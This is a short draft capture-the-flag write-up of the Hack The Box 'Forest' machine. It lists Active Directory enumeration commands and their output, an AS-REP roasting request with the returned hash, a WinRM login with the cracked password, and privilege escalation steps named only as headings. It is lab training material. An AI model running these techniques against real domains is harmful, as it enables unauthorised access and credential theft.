---
title: "WriteUp HtB Forest"
date: 2025-01-31T00:00:00Z
type: "post"
draft: true
---

Commands in order

# Nmap scan
## all ports, OS, verbose, scripts, fast, output
```nmap 10.10.10.161 -p- -O -sV -sC -f -oA forest```

DNS, Kerb, LDAP, RPC, http 1.0(?), SMB

# SMB recon no creds
## search SMB list of drives
```smbclient -L 10.10.10.161```

# DNS recon no creds
## nslookup will bring up a list of 
```nslookup```
```server 10.10.10.161```
## look for domain names
```127.0.0.1```
```127.0.0.2```

# RPC recon no creds
## search using rpcclient, there are subcommands within the terminal
```rpcclient -U '' -N 10.10.10.161```
## At this point I don't know any users
```lsaquery```
Domain Name: HTB
Domain Sid: S-1-5-21-3072663084-364016917-1341370565
```enumdomgroups```
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]
```enumdomusers```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

## Remote Procedure Call connects 
RPC ties services remotely in a Windows environment. In some configurations, RPC services may not require authentication for certain queries. This can allow an unauthenticated user to gather info about the domain and users.

## Now we have some users
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

# LDAP Enumeration with some usernames
## Initial ldapsearch
```ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local"```
A lot of data, to look for specifics
```ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" 'objectClass=User' sAMAccountName | grep "sAMAccountName"```
# requesting: sAMAccountName 
sAMAccountName: Guest
sAMAccountName: DefaultAccount
sAMAccountName: FOREST$
sAMAccountName: EXCH01$
sAMAccountName: $331000-VK4ADACQNUCA
sAMAccountName: SM_2c8eef0a09b545acb
sAMAccountName: SM_ca8c2ed5bdab4dc9b
sAMAccountName: SM_75a538d3025e4db9a
sAMAccountName: SM_681f53d4942840e18
sAMAccountName: SM_1b41c9286325456bb
sAMAccountName: SM_9b69f1b9d2cc45549
sAMAccountName: SM_7c96b981967141ebb
sAMAccountName: SM_c75ee099d0a64c91b
sAMAccountName: SM_1ffab36a2f5f479cb
sAMAccountName: HealthMailboxc3d7722
sAMAccountName: HealthMailboxfc9daad
sAMAccountName: HealthMailboxc0a90c9
sAMAccountName: HealthMailbox670628e
sAMAccountName: HealthMailbox968e74d
sAMAccountName: HealthMailbox6ded678
sAMAccountName: HealthMailbox83d6781
sAMAccountName: HealthMailboxfd87238
sAMAccountName: HealthMailboxb01ac64
sAMAccountName: HealthMailbox7108a4e
sAMAccountName: HealthMailbox0659cc1
sAMAccountName: sebastien
sAMAccountName: lucinda
sAMAccountName: andy
sAMAccountName: mark
sAMAccountName: santi

Interesting it missed the service name

# Back to RPC
## Noticed how there is a service username, which isn't shown in our LDAP recon
```rpcclient -U '' -N 10.10.10.161```
```queryuser 0x47b```

.
.
.
unknown_2[0..31]...
        user_rid :      0x47b
        group_rid:      0x201
        acb_info :      0x00010210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000006
        padding1[0..7]...
        logon_hrs[0..21]...
.
.
.

There is a group_rid
```querygroup 0x201```
querygroup 0x201
    Group Name:     Domain Users
    Description:    All domain users
    Group Attribute:7
    Num Members:30

# Run bruteforce

# Check for public list of TGTs (Ticket-Granting Ticket)
## Use GetNPUsers
```impacket-GetNPUsers -dc-ip 10.10.10.161 -format hashcat -request 'htb.local/'```

$krb5asrep$23$svc-alfresco@HTB.LOCAL:072317c6ef504dc228ccf5090f930b37$af5e8e81cb9ad3234bb4c015bd8c8fdd98f9bdaffce467f92b6383fb0c34d6d8aff83e6fc09e4a0dddfd85499517c0303e98c04cf7bfe503cb5f1f31667afee0b28e6ad99b744697e28ab70a4951f50e39ba088b22600d88caefcce0758fea80c9f9003507063d7510cb9f225f49f9979a708a572d1e076efb9125b4459da51593d9c9aeba72219e72a53e6a378726257f2a4f828d6471098772ef7b3e2caef4c02465c814ff5fe470c78bd33023dfecd323d3d703b2f9112c28dc9c86f25032a0e05be2e8baeae2e603dd3e598918c3587d24b5f873fff4aae67dcd8c956e05e5578dd84c33
## The hash I received kept changing and I had to keep debugging ... If this happened on the exam I would have failed because I would be getting unreliable hashes
## Was the wordlist that was the problem ...

# SMB with creds
## There is read access to two network shares, but no real information revealed

# Initial Foothold WinRM with creds
## Initially this remote management would have been impossible, but because we have credentials we can get an initial shell.
```evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice```

We can get the user flag now.


# Privilege Escalation
## Bloodhound
## Searched for AD group connections and their privileges
## Created attacker account on AD that could read hashes
## Used PowerView.ps1 to leverage PowerShell scripts
## Impacket-Secretsdump to dump the hashes
## Pass the Hash to get Admin Shell

## Impacket-Ticketer has outdated package dependencies